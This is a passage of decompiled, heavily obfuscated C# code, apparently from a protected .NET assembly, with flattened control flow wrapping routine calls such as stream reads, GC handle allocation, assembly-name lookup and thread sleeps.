            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.ႷႷ);
            num1 = 6;
            continue;
        }
      }
label_5:
      return 5;
label_10:
      return 5;
label_15:
      return 5;
label_21:
      return 4;
label_26:
      return 9;
label_31:
      return 14;
label_34:
      \u0006.Ⴅ();
label_35:
      int num2 = index + 1;
      return 13;
    }

    internal static int ႠႤ([In] Stream obj0, [In] short obj1, [In] char obj2)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 5;
      int num3;
      int num4;
      while (true)
      {
        switch (num2)
        {
          case 1:
            num2 = 5;
            continue;
          case 2:
          case 4:
          case 8:
            goto label_8;
          case 3:
            int num5 = num4 * 8;
            Ⴍ.Ⴜ.Ⴗ[95] = (byte) (((int) Ⴍ.Ⴜ.Ⴗ[95] ^ (int) Ⴍ.Ⴜ.Ⴗ[125]) & 146);
            num2 = 7024 > 878 - num5 ? 2 : (int) ⴗ[66] - (int) ⴗ[79];
            continue;
          case 5:
            num3 = obj0.ReadByte();
            ++num1;
            goto case 7;
          case 6:
            goto label_3;
          case 7:
            num4 = 59;
            num2 = 3;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.ႠႤ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return num3;
    }

    internal static GCHandle ႠႠ([In] object obj0, [In] GCHandleType obj1, [In] short obj2, [In] int obj3)
    {
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 5;
      GCHandle gcHandle;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 4:
          case 7:
            goto label_6;
          case 2:
            int num3 = (int) obj2;
            int num4 = num3 * num3;
            num2 = ((int) obj2 + num4) % 2 != 0 ? 5 : (int) ⴗ[82];
            continue;
          case 3:
            goto label_3;
          case 5:
            gcHandle = GCHandle.Alloc(obj0, obj1);
            ++num1;
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.ႠႠ);
            num2 = (int) ⴗ[115] - 51;
            continue;
        }
      }
label_6:
      return gcHandle;
    }

    internal static string ႠႣ([In] AssemblyName obj0, [In] char obj1, [In] int obj2)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = (int) ⴍ[356] - 3;
      ICloneable name;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            num2 = 1;
            continue;
          case 1:
            num2 = 2045 > 409 - num3 * 5 ? (int) ⴍ[371] - 30 : (int) ⴗ[33] - 65;
            continue;
          case 2:
            name = (ICloneable) obj0.Name;
            ++num1;
            goto case 5;
          case 3:
            num2 = (int) ⴗ[22] - 156;
            continue;
          case 4:
            goto label_3;
          case 5:
            num3 = 242;
            goto case 0;
          case 8:
            goto label_9;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႣ.ႠႣ);
            num2 = 4;
            continue;
        }
      }
label_9:
      return (string) name;
    }

    internal static void ႠႨ([In] int obj0, [In] int obj1, [In] char obj2)
    {
      int num1 = 0;
      int num2;
      int num3;
      int num4;
      while (true)
      {
        switch (num1)
        {
          case 1:
            Thread.Sleep(obj0);
            goto case 7;
          case 2:
          case 5:
            num4 = 685;
            goto case 6;
          case 3:
            num1 = 1;
            continue;
          case 4:
            goto label_8;
          case 6:
            num1 = 3425 > num4 - num3 * 5 ? 4 : 3;
            continue;
          case 7:
            ++num2;
            num3 = 676;
            num1 = 5;
            continue;
          default:
            num2 = 0;
            num1 = 1;
            continue;
        }
      }
label_8:;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct ႠႭ
    {
      internal ႷႥ[] Ⴍ;
      internal int Ⴃ;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct ႠႥ
    {
      internal uint Ⴄ;
    }
  }
}
